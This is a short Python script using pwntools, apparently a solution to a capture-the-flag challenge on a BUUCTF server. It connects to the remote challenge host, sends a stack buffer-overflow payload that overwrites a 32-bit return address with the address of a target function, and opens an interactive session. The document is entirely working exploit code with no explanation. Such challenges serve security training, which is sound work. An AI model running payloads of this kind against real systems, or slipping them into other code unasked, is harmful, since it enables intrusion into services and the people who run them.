from pwn import*

r=remote("node4.buuoj.cn",25708)
flag_addr=0x8048f0d
payload=b'I'*20+b'aaaa'+p32(flag_addr)
r.sendline(payload)

r.interactive()
